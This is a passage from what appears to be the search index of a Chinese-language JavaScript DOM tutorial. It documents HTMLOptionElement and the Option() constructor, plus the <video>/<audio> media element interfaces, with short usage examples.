\u63a5\u53e3\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0cHTMLOptionElement \u63a5\u53e3\u5177\u6709\u4e0b\u9762\u7684\u5c5e\u6027\u3002 disabled \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u53ef\u9009\u62e9\u3002 defaultSelected \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\u3002\u4e00\u65e6\u8bbe\u4e3a true \uff0c\u8be5\u9879\u7684\u503c\u5c31\u662f <select> \u7684\u9ed8\u8ba4\u503c\u3002 form \uff1a\u8fd4\u56de <option> \u6240\u5728\u7684\u8868\u5355\u5143\u7d20\u3002\u5982\u679c\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u8868\u5355\uff0c\u5219\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 index \uff1a\u6574\u6570\uff0c\u8868\u793a\u8be5\u9009\u9879\u5728\u6574\u4e2a\u4e0b\u62c9\u5217\u8868\u91cc\u9762\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 label \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5bf9\u8be5\u9009\u9879\u7684\u8bf4\u660e\u3002\u5982\u679c\u8be5\u5c5e\u6027\u672a\u8bbe\u7f6e\uff0c\u5219\u8fd4\u56de\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002 selected \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9009\u9879\u662f\u5426\u9009\u4e2d\u3002 text \uff1a\u5b57\u7b26\u4e32\uff0c\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002 value \uff1a\u5b57\u7b26\u4e32\uff0c\u8be5\u9009\u9879\u7684\u503c\u3002\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u4e0a\u4f20\u7684\u5c31\u662f\u9009\u4e2d\u9879\u7684\u8fd9\u4e2a\u5c5e\u6027\u3002 Option() \u6784\u9020\u51fd\u6570 \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Option() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 HTMLOptionElement \u5b9e\u4f8b\u3002 1 new Option ( text , value , defaultSelected , selected ) \u5b83\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\u3002 text\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002\u5982\u679c\u7701\u7565\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 value\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u503c\u3002\u5982\u679c\u7701\u7565\uff0c\u9ed8\u8ba4\u8fd4\u56de text \u5c5e\u6027\u7684\u503c\u3002 defaultSelected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u6ce8\u610f\uff0c\u5373\u4f7f\u8bbe\u4e3a true \uff0c\u4e5f\u4e0d\u4ee3\u8868\u8be5\u9879\u7684 selected \u5c5e\u6027\u4e3a true \u3002 selected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \u3002 1 2 3 4 5 6 var newOption = new Option ( 'hello' , 'world' , true ); newOption . text // \"hello\" newOption . value // \"world\" newOption . defaultSelected // true newOption . selected // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c newOption \u7684 defaultSelected \u5c5e\u6027\u4e3a true \uff0c\u4f46\u662f\u5b83\u6ca1\u6709\u88ab\u9009\u4e2d\uff08\u5373 selected \u5c5e\u6027\u4e3a false \uff09\u3002","title":"option"},{"location":"elements/option/#_1","text":"<option> \u5143\u7d20\u8868\u793a\u4e0b\u62c9\u6846\uff08 <select> \uff0c <optgroup> \u6216 <datalist> \uff09\u91cc\u9762\u7684\u4e00\u4e2a\u9009\u9879\u3002\u5b83\u662f HTMLOptionElement \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002","title":" \u5143\u7d20"},{"location":"elements/option/#_2","text":"\u9664\u4e86\u7ee7\u627f HTMLElement \u63a5\u53e3\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0cHTMLOptionElement \u63a5\u53e3\u5177\u6709\u4e0b\u9762\u7684\u5c5e\u6027\u3002 disabled \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u53ef\u9009\u62e9\u3002 defaultSelected \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\u3002\u4e00\u65e6\u8bbe\u4e3a true \uff0c\u8be5\u9879\u7684\u503c\u5c31\u662f <select> \u7684\u9ed8\u8ba4\u503c\u3002 form \uff1a\u8fd4\u56de <option> \u6240\u5728\u7684\u8868\u5355\u5143\u7d20\u3002\u5982\u679c\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u8868\u5355\uff0c\u5219\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 index \uff1a\u6574\u6570\uff0c\u8868\u793a\u8be5\u9009\u9879\u5728\u6574\u4e2a\u4e0b\u62c9\u5217\u8868\u91cc\u9762\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 label \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5bf9\u8be5\u9009\u9879\u7684\u8bf4\u660e\u3002\u5982\u679c\u8be5\u5c5e\u6027\u672a\u8bbe\u7f6e\uff0c\u5219\u8fd4\u56de\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002 selected \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9009\u9879\u662f\u5426\u9009\u4e2d\u3002 text \uff1a\u5b57\u7b26\u4e32\uff0c\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002 value \uff1a\u5b57\u7b26\u4e32\uff0c\u8be5\u9009\u9879\u7684\u503c\u3002\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u4e0a\u4f20\u7684\u5c31\u662f\u9009\u4e2d\u9879\u7684\u8fd9\u4e2a\u5c5e\u6027\u3002","title":"\u5c5e\u6027"},{"location":"elements/option/#option","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Option() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 HTMLOptionElement \u5b9e\u4f8b\u3002 1 new Option ( text , value , defaultSelected , selected ) \u5b83\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\u3002 text\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002\u5982\u679c\u7701\u7565\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 value\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u503c\u3002\u5982\u679c\u7701\u7565\uff0c\u9ed8\u8ba4\u8fd4\u56de text \u5c5e\u6027\u7684\u503c\u3002 defaultSelected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u6ce8\u610f\uff0c\u5373\u4f7f\u8bbe\u4e3a true \uff0c\u4e5f\u4e0d\u4ee3\u8868\u8be5\u9879\u7684 selected \u5c5e\u6027\u4e3a true \u3002 selected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \u3002 1 2 3 4 5 6 var newOption = new Option ( 'hello' , 'world' , true ); newOption . text // \"hello\" newOption . value // \"world\" newOption . defaultSelected // true newOption . selected // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c newOption \u7684 defaultSelected \u5c5e\u6027\u4e3a true \uff0c\u4f46\u662f\u5b83\u6ca1\u6709\u88ab\u9009\u4e2d\uff08\u5373 selected \u5c5e\u6027\u4e3a false \uff09\u3002","title":"Option() \u6784\u9020\u51fd\u6570"},{"location":"elements/video/","text":"\uff0c \u00b6 \u6982\u8ff0 \u00b6 <video> \u5143\u7d20\u7528\u6765\u52a0\u8f7d\u89c6\u9891\uff0c\u662f HTMLVideoElement \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002 <audio> \u5143\u7d20\u7528\u6765\u52a0\u8f7d\u97f3\u9891\uff0c\u662f HTMLAudioElement \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u800c HTMLVideoElement \u548c HTMLAudioElement \u90fd\u7ee7\u627f\u4e86 HTMLMediaElement \uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u6709\u8bb8\u591a\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u653e\u5728\u4e00\u8d77\u4ecb\u7ecd\u3002 \u7406\u8bba\u4e0a\uff0c\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u76f4\u63a5\u7528 src \u5c5e\u6027\u6307\u5b9a\u5a92\u4f53\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002 1 2 < audio src = \"background_music.mp3\" /> < video src = \"news.mov\" width = 320 height = 240/ > \u6ce8\u610f\uff0c <video> \u5143\u7d20\u6709 width \u5c5e\u6027\u548c height \u5c5e\u6027\uff0c\u53ef\u4ee5\u6307\u5b9a\u5bbd\u548c\u9ad8\u3002 <audio> \u5143\u7d20\u6ca1\u6709\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u56e0\u4e3a\u5b83\u7684\u64ad\u653e\u5668\u5916\u5f62\u662f\u6d4f\u89c8\u5668\u7ed9\u5b9a\u7684\uff0c\u4e0d\u80fd\u6307\u5b9a\u3002 \u5b9e\u9645\u4e0a\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u652f\u6301\u4e0d\u540c\u7684\u5a92\u4f53\u683c\u5f0f\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u7528 <source> \u5143\u7d20\u6307\u5b9a\u540c\u4e00\u4e2a\u5a92\u4f53\u6587\u4ef6\u7684\u4e0d\u540c\u683c\u5f0f\u3002 1 2 3 4 < audio id = \"music\" > < source src = \"music.mp3\" type = \"audio/mpeg\" > < source src = \"music.ogg\" type = 'audio/ogg; codec=\"vorbis\"' > </ audio > \u6d4f\u89c8\u5668\u9047\u5230\u652f\u6301\u7684\u683c\u5f0f\uff0c\u5c31\u4f1a\u5ffd\u7565\u540e\u9762\u7684\u683c\u5f0f\u3002 \u8fd9\u4e24\u4e2a\u5143\u7d20\u90fd\u6709\u4e00\u4e2a controls \u5c5e\u6027\uff0c\u53ea\u6709\u6253\u5f00\u8fd9\u4e2a\u5c5e\u6027\uff0c\u624d\u4f1a\u663e\u793a\u63a7\u5236\u6761\u3002\u6ce8\u610f\uff0c <audio> \u5143\u7d20\u5982\u679c\u4e0d\u6253\u5f00 controls \u5c5e\u6027\uff0c\u6839\u672c\u4e0d\u4f1a\u663e\u793a\uff0c\u800c\u662f\u76f4\u63a5\u5728\u80cc\u666f\u64ad\u653e\u3002 HTMLMediaElement \u63a5\u53e3 \u00b6 HTMLMediaElement \u5e76\u6ca1\u6709\u5bf9\u5e94\u7684 HTML \u5143\u7d20\uff0c\u800c\u662f\u4f5c\u4e3a <video> \u548c <audio> \u7684\u57fa\u7c7b\uff0c\u5b9a\u4e49\u4e00\u4e9b\u5b83\u4eec\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 HTMLMediaElement \u63a5\u53e3\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 HTMLMediaElement.audioTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u5305\u542b\u7684\u97f3\u8f68\u3002 HTMLMediaElement.autoplay\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u81ea\u52a8\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 autoplay \u3002 HTMLMediaElement.buffered\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7f13\u51b2\u7684\u5185\u5bb9\u3002\u8be5\u5bf9\u8c61\u7684 length \u5c5e\u6027\u8fd4\u56de\u7f13\u5b58\u91cc\u9762\u6709\u591a\u5c11\u6bb5\u5185\u5bb9\uff0c start(rangeId) \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\uff08\u4ece0\u5f00\u59cb\uff09\u5f00\u59cb\u7684\u65f6\u95f4\u70b9\uff0c end() \u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\u7ed3\u675f\u7684\u65f6\u95f4\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.controls\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u63a7\u5236\u680f\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 controls \u3002 HTMLMediaElement.controlsList\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u63a7\u5236\u680f\u7684\u67d0\u4e9b\u63a7\u4ef6\u3002\u8be5\u5bf9\u8c61\u5305\u542b\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a nodownload \u3001 nofullscreen \u548c noremoteplayback \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.crossOrigin\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\u662f\u5426\u9644\u5e26\u7528\u6237\u4fe1\u606f\uff08\u6bd4\u5982 Cookie\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 crossorigin \u3002\u8be5\u5c5e\u6027\u53ea\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\uff1a anonymous \u548c use-credentials \u3002 HTMLMediaElement.currentSrc\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6b63\u5728\u64ad\u653e\u7684\u5a92\u4f53\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.currentTime\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5f53\u524d\u64ad\u653e\u7684\u65f6\u95f4\u70b9\u3002 HTMLMediaElement.defaultMuted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9ed8\u8ba4\u662f\u5426\u5173\u95ed\u97f3\u91cf\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 muted \u3002 HTMLMediaElement.defaultPlaybackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u7387\uff0c\u9ed8\u8ba4\u662f1.0\u3002 HTMLMediaElement.disableRemotePlayback\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u5141\u8bb8\u8fdc\u7a0b\u56de\u653e\uff0c\u5373\u8fdc\u7a0b\u56de\u653e\u7684\u65f6\u5019\u662f\u5426\u4f1a\u6709\u5de5\u5177\u680f\u3002 HTMLMediaElement.duration\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u65f6\u95f4\u957f\u5ea6\uff08\u5355\u4f4d\u79d2\uff09\u3002\u5982\u679c\u5f53\u524d\u6ca1\u6709\u5a92\u4f53\u6587\u4ef6\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de0\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.ended\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5df2\u7ecf\u64ad\u653e\u7ed3\u675f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.error\uff1a\u8fd4\u56de\u6700\u8fd1\u4e00\u6b21\u62a5\u9519\u7684\u9519\u8bef\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u62a5\u9519\uff0c\u8fd4\u56de null \u3002 HTMLMediaElement.loop\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u4f1a\u5faa\u73af\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 loop \u3002 HTMLMediaElement.muted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u97f3\u91cf\u662f\u5426\u5173\u95ed\u3002 HTMLMediaElement.networkState\uff1a\u5f53\u524d\u7f51\u7edc\u72b6\u6001\uff0c\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\u30020\u8868\u793a\u6ca1\u6709\u6570\u636e\uff1b1\u8868\u793a\u5a92\u4f53\u5143\u7d20\u5904\u5728\u6fc0\u6d3b\u72b6\u6001\uff0c\u4f46\u662f\u8fd8\u6ca1\u5f00\u59cb\u4e0b\u8f7d\uff1b2\u8868\u793a\u4e0b\u8f7d\u4e2d\uff1b3\u8868\u793a\u6ca1\u6709\u627e\u5230\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.paused\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5904\u5728\u6682\u505c\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.playbackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u64ad\u653e\u901f\u5ea6\uff0c1.0\u662f\u6b63\u5e38\u901f\u5ea6\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u8868\u793a\u5411\u540e\u64ad\u653e\u3002 HTMLMediaElement.played\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u64ad\u653e\u7684\u5a92\u4f53\u5185\u5bb9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.preload\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5e94\u8be5\u9884\u52a0\u8f7d\u54ea\u4e9b\u5185\u5bb9\uff0c\u53ef\u80fd\u7684\u503c\u4e3a none \u3001 metadata \u548c auto \u3002 HTMLMediaElement.readyState\uff1a\u6574\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u51c6\u5907\u72b6\u6001\uff0c\u53ef\u80fd\u7684\u503c\u4e3a0\uff08\u6ca1\u6709\u4efb\u4f55\u6570\u636e\uff09\u30011\uff08\u5df2\u83b7\u53d6\u5143\u6570\u636e\uff09\u30012\uff08\u53ef\u64ad\u653e\u5f53\u524d\u5e27\uff0c\u4f46\u4e0d\u8db3\u4ee5\u64ad\u653e\u591a\u4e2a\u5e27\uff09\u30013\uff08\u53ef\u4ee5\u64ad\u653e\u591a\u5e27\uff0c\u81f3\u5c11\u4e3a\u4e24\u5e27\uff09\u30014\uff08\u53ef\u4ee5\u6d41\u7545\u64ad\u653e\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.seekable\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u641c\u7d22\u7684\u5a92\u4f53\u5185\u5bb9\u8303\u56f4\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.seeking\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u6b63\u5728\u5bfb\u627e\u65b0\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.src\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u6240\u5728\u7684 URL\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 src \u3002 HTMLMediaElement.srcObject\uff1a\u8fd4\u56de src \u5c5e\u6027\u5bf9\u5e94\u7684\u5a92\u4f53\u6587\u4ef6\u8d44\u6e90\uff0c\u53ef\u80fd\u662f MediaStream \u3001 MediaSource \u3001 Blob \u6216 File \u5bf9\u8c61\u3002\u76f4\u63a5\u6307\u5b9a\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u64ad\u653e\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.textTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u6240\u6709\u6587\u672c\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.videoTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u591a\u6709\u89c6\u9891\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.volume\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u97f3\u91cf\u30020.0 \u8868\u793a\u9759\u97f3\uff0c1.0 \u8868\u793a\u6700\u5927\u97f3\u91cf\u3002 HTMLMediaElement \u63a5\u53e3\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 HTMLMediaElement.addTextTrack()\uff1a\u6dfb\u52a0\u6587\u672c\u8f68\u9053\uff08\u6bd4\u5982\u5b57\u5e55\uff09\u5230\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.captureStream()\uff1a\u8fd4\u56de\u4e00\u4e2a MediaStream \u5bf9\u8c61\uff0c\u7528\u6765\u6355\u83b7\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u7684\u6d41\u5185\u5bb9\u3002 HTMLMediaElement.canPlayType()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a MIME \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u6765\u5224\u65ad\u8fd9\u79cd\u7c7b\u578b\u7684\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\uff0c probably \u8868\u793a\u4f3c\u4e4e\u53ef\u64ad\u653e\uff0c maybe \u8868\u793a\u65e0\u6cd5\u5728\u4e0d\u64ad\u653e\u7684\u60c5\u51b5\u4e0b\u5224\u65ad\u662f\u5426\u53ef\u64ad\u653e\uff0c\u7a7a\u5b57\u7b26\u4e32\u8868\u793a\u65e0\u6cd5\u64ad\u653e\u3002 HTMLMediaElement.fastSeek()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6d6e\u70b9\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6307\u5b9a\u7684\u65f6\u95f4\uff08\u5355\u4f4d\u79d2\uff09\u3002\u8be5\u65b9\u6cd5\u5c06\u5a92\u4f53\u6587\u4ef6\u79fb\u52a8\u5230\u6307\u5b9a\u65f6\u95f4\u3002 HTMLMediaElement.load()\uff1a\u91cd\u65b0\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.pause()\uff1a\u6682\u505c\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 HTMLMediaElement.play()\uff1a\u5f00\u59cb\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002 \u4e0b\u9762\u662f play() \u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var myVideo = document . getElementById ( 'myVideoElement' ); myVideo . play () . then (() => { console . log ( 'playing' ); }) . catch (( error ) => { console . log ( error ); }); HTMLVideoElement \u63a5\u53e3 \u00b6 HTMLVideoElement \u63a5\u53e3\u4ee3\u8868\u4e86 <video> \u5143\u7d20\u3002\u8fd9\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86 HTMLMediaElement \u63a5\u53e3\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 HTMLVideoElement \u63a5\u53e3\u7684\u5c5e\u6027\u3002 HTMLVideoElement.height\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 height \u3002 HTMLVideoElement.width\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 width \u3002 HTMLVideoElement.videoHeight\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 HTMLVideoElement.videoWidth\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 HTMLVideoElement.poster\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e00\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684 URL\uff0c\u7528\u6765\u5728\u65e0\u6cd5\u83b7\u53d6\u89c6\u9891\u6587\u4ef6\u65f6\u66ff\u4ee3\u663e\u793a\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 poster \u3002 HTMLVideoElement \u63a5\u53e3\u7684\u65b9\u6cd5\u3002 HTMLVideoElement.getVideoPlaybackQuality()\uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u89c6\u9891\u56de\u653e\u7684\u4e00\u4e9b\u6570\u636e\u3002 HTMLAudioElement \u63a5\u53e3 \u00b6 HTMLAudioElement \u63a5\u53e3\u4ee3\u8868\u4e86 <audio> \u5143\u7d20\u3002 \u8be5\u63a5\u53e3\u7ee7\u627f\u4e86 HTMLMediaElement \uff0c\u4f46\u662f\u6ca1\u6709\u5b9a\u4e49\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Audio() \u6784\u9020\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u5c31\u662f HTMLAudioElement \u5b9e\u4f8b\u3002 1 var song = new Audio ([ URLString ]); Audio() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684 URL\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ef\u4ee5\u7a0d\u540e\u901a\u8fc7 src \u5c5e\u6027\u6307\u5b9a\u3002 \u751f\u6210 HTMLAudioElement \u5b9e\u4f8b\u4ee5\u540e\uff0c\u4e0d\u7528\u63d2\u5165 DOM\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 play() \u65b9\u6cd5\u5728\u80cc\u666f\u64ad\u653e\u3002 javascript var a = new Audio(); if (a.canPlayType('audio/wav')) { a.src = 'soundeffect.wav'; a.play(); } \u4e8b\u4ef6 \u00b6 <video> \u548c <audio> \u5143\u7d20\u6709\u4ee5\u4e0b\u4e8b\u4ef6\u3002 loadstart\uff1a\u5f00\u59cb\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\u3002 